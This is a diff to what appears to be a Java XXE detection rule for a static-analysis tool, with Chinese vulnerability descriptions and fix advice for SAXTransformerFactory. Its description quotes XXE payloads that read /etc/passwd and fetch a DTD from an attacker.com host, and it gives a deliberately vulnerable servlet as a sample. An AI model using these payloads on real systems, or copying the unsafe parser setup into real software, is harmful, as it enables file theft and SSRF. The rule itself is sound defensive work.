@@ -4,16 +4,12 @@ desc(
 	risk:XXE
 	desc: <<<DESC
 ### 漏洞描述
-
 1. **漏洞原理**
 XXE（XML External Entity）即XML外部实体注入漏洞，发生在应用程序解析XML输入时，由于没有禁止外部实体的加载，攻击者可以构造恶意XML，引用外部实体，从而导致读取任意文件，进行SSRF攻击，甚至在特定条件下执行系统命令。`SAXTransformerFactory`在默认配置下允许加载外部实体，如果应用程序使用此工厂处理来自不可信源的XML数据，就可能引入XXE风险。
-
 2. **触发场景**
 当应用程序接收外部XML输入（如用户上传的XML文件、请求体中的XML数据）并使用`SAXTransformerFactory.newInstance()`创建的工厂来解析或转换这些XML时，如果未禁用外部实体的加载，攻击者可以通过构造含有恶意外部实体引用的XML来触发漏洞。例如，XML中包含 `<!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>` 或 `<!DOCTYPE root [<!ENTITY xxe SYSTEM "http://attacker.com/malicious.dtd">]>` 这样的定义，应用程序解析时会尝试读取文件或访问URL。
-
 ```java
 package com.example.sax;
-
 import javax.servlet.ServletException;
 import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
@@ -25,22 +21,20 @@ import javax.xml.transform.sax.TransformerHandler;
 import javax.xml.transform.stream.StreamResult;
 import javax.xml.transform.stream.StreamSource;
 import java.io.IOException;
-
 public class SAXTransformerFactoryServlet extends HttpServlet {
-    private void postNoFixXxe(HttpServletRequest req, HttpServletResponse resp){
-        try{
-            SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();
-            StreamSource source = new StreamSource(req.getReader());
-            TransformerHandler transformerHandler = sf.newTransformerHandler(source);
-            Result result = new StreamResult(resp.getWriter());
-            transformerHandler.setResult(result);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
+private void postNoFixXxe(HttpServletRequest req, HttpServletResponse resp){
+try{
+SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();
+StreamSource source = new StreamSource(req.getReader());
+TransformerHandler transformerHandler = sf.newTransformerHandler(source);
+Result result = new StreamResult(resp.getWriter());
+transformerHandler.setResult(result);
+} catch (Exception e) {
+e.printStackTrace();
+}
+}
 }
 ```
-
 3. **潜在影响**
 - **敏感信息泄露：** 攻击者可以读取服务器上的任意文件，包括配置文件、源代码、用户数据等。
 - **拒绝服务：** 通过引入大量嵌套的外部实体，攻击者可能导致解析器消耗大量内存和CPU资源，造成服务不可用（Billion Laughs攻击）。
@@ -51,14 +45,11 @@ DESC
 	title_zh: "检测 Java SAXTransformerFactory 不安全使用 (XXE)"
 	solution: <<<SOLUTION
 ### 修复建议
-
 #### 1. 禁用外部实体和DOCTYPE声明
 防止解析器处理外部实体和DOCTYPE声明是防止XXE漏洞最有效的方法。可以通过设置`SAXTransformerFactory`的属性来实现：
-
 ```java
 // 修复代码示例
 package com.example.sax;
-
 import javax.servlet.ServletException;
 import javax.servlet.http.HttpServlet;
 import javax.servlet.http.HttpServletRequest;
@@ -70,34 +61,30 @@ import javax.xml.transform.sax.TransformerHandler;
 import javax.xml.transform.stream.StreamResult;
 import javax.xml.transform.stream.StreamSource;
 import java.io.IOException;
-
 public class SAXTransformerFactoryServlet extends HttpServlet {
-    private void postWithFixXxe(HttpServletRequest req, HttpServletResponse resp){
-        try{
-            SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();
-            // 禁用外部DTD
-            sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
-            // 禁用外部样式表
-            sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
-            // 对于一些旧版本的JDK或解析器，可能还需要设置其他属性
-            // sf.setAttribute("http://apache.org/xml/features/disallow-doctype-decl", true);
-            // sf.setAttribute("http://xml.org/sax/features/external-general-entities", false);
-            // sf.setAttribute("http://xml.org/sax/features/external-parameter-entities", false);
-            
-            StreamSource source = new StreamSource(req.getReader());
-            TransformerHandler transformerHandler = sf.newTransformerHandler(source);
-            Result result = new StreamResult(resp.getWriter());
-            transformerHandler.setResult(result);
-        } catch (Exception e) {
-            e.printStackTrace();
-        }
-    }
+private void postWithFixXxe(HttpServletRequest req, HttpServletResponse resp){
+try{
+SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();
+// 禁用外部DTD
+sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
+// 禁用外部样式表
+sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
+// 对于一些旧版本的JDK或解析器，可能还需要设置其他属性
+// sf.setAttribute("http://apache.org/xml/features/disallow-doctype-decl", true);
+// sf.setAttribute("http://xml.org/sax/features/external-general-entities", false);
+// sf.setAttribute("http://xml.org/sax/features/external-parameter-entities", false);
+StreamSource source = new StreamSource(req.getReader());
+TransformerHandler transformerHandler = sf.newTransformerHandler(source);
+Result result = new StreamResult(resp.getWriter());
+transformerHandler.setResult(result);
+} catch (Exception e) {
+e.printStackTrace();
+}
+}
 }
 ```
-
 #### 2. 使用安全的解析库或配置
 一些现代的XML解析库或框架在默认情况下已经禁用了外部实体。如果可能，优先考虑使用这些库。确保使用的Java版本和库版本是较新的，并且了解其默认的安全配置。
-
 #### 3. 对用户输入的XML进行严格验证和过滤
 在解析XML之前，对输入的XML进行验证，确保其结构和内容符合预期，并移除或过滤掉所有外部实体声明和引用。
 SOLUTION
@@ -110,10 +97,92 @@ SAXTransformerFactory.newInstance() as $ins;
 $ins?{!.setAttribute}.newTransformerHandler().setResult() as $vuln;
 check $vuln;
 alert $vuln for {
-	title: "Check Java SAXTransformerFactory Unsafe Use (XXE)",
-	title_zh: "检测 Java SAXTransformerFactory 不安全使用 (XXE)",
-	level: "warning",
-	message: "SAXTransformerFactory Unsafe Use in Context Sink",
+	title: "Java SAXTransformerFactory Unsafe Use (XXE) Was Detected",
+	title_zh: "检测到 Java SAXTransformerFactory 不安全使用 (XXE)",
+	level: "high",
+	message: "检测到SAXTransformerFactory在解析XML时未禁用外部实体，可能导致XXE漏洞。",
+	desc: <<<DESC
+### 漏洞描述
+1. **漏洞原理**
+XXE（XML External Entity）即XML外部实体注入漏洞，发生在应用程序解析XML输入时，由于没有禁止外部实体的加载，攻击者可以构造恶意XML，引用外部实体，从而导致读取任意文件，进行SSRF攻击，甚至在特定条件下执行系统命令。
+2. **触发场景**
+当应用程序接收外部XML输入并使用`SAXTransformerFactory.newInstance()`创建的工厂来解析或转换这些XML时，如果未禁用外部实体的加载，攻击者可以通过构造含有恶意外部实体引用的XML来触发漏洞。
+```java
+package com.example.sax;
+import javax.servlet.ServletException;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import javax.xml.XMLConstants;
+import javax.xml.transform.Result;
+import javax.xml.transform.sax.SAXTransformerFactory;
+import javax.xml.transform.sax.TransformerHandler;
+import javax.xml.transform.stream.StreamResult;
+import javax.xml.transform.stream.StreamSource;
+import java.io.IOException;
+public class SAXTransformerFactoryServlet extends HttpServlet {
+private void postNoFixXxe(HttpServletRequest req, HttpServletResponse resp){
+try{
+SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();
+StreamSource source = new StreamSource(req.getReader());
+TransformerHandler transformerHandler = sf.newTransformerHandler(source);
+Result result = new StreamResult(resp.getWriter());
+transformerHandler.setResult(result);
+} catch (Exception e) {
+e.printStackTrace();
+}
+}
+}
+```
+3. **潜在影响**
+- **敏感信息泄露：** 攻击者可以读取服务器上的任意文件。
+- **拒绝服务：** 通过引入大量嵌套的外部实体，攻击者可能导致解析器消耗大量内存和CPU资源。
+- **内部网络探测：** 通过SSRF攻击，攻击者可以扫描和攻击应用程序所在的内部网络。
+- **端口扫描：** 攻击者可以利用外部实体访问指定的端口，判断端口的开放状态。
+DESC
+	name: "vuln",
+	solution: <<<SOLUTION
+### 修复建议
+#### 1. 禁用外部实体和DOCTYPE声明
+防止解析器处理外部实体和DOCTYPE声明是防止XXE漏洞最有效的方法。可以通过设置`SAXTransformerFactory`的属性来实现：
+```java
+// 修复代码示例
+package com.example.sax;
+import javax.servlet.ServletException;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import javax.xml.XMLConstants;
+import javax.xml.transform.Result;
+import javax.xml.transform.sax.SAXTransformerFactory;
+import javax.xml.transform.sax.TransformerHandler;
+import javax.xml.transform.stream.StreamResult;
+import javax.xml.transform.stream.StreamSource;
+import java.io.IOException;
+public class SAXTransformerFactoryServlet extends HttpServlet {
+private void postWithFixXxe(HttpServletRequest req, HttpServletResponse resp){
+try{
+SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();
+// 禁用外部DTD
+sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
+// 禁用外部样式表
+sf.setAttribute(XMLConstants.ACCESS_EXTERNAL_STYLESHEET, "");
+StreamSource source = new StreamSource(req.getReader());
+TransformerHandler transformerHandler = sf.newTransformerHandler(source);
+Result result = new StreamResult(resp.getWriter());
+transformerHandler.setResult(result);
+} catch (Exception e) {
+e.printStackTrace();
+}
+}
+}
+```
+#### 2. 使用安全的解析库或配置
+一些现代的XML解析库或框架在默认情况下已经禁用了外部实体。如果可能，优先考虑使用这些库。
+#### 3. 对用户输入的XML进行严格验证和过滤
+在解析XML之前，对输入的XML进行验证，确保其结构和内容符合预期，并移除或过滤掉所有外部实体声明和引用。
+SOLUTION
+	risk: "XXE",
 }
 
 desc(
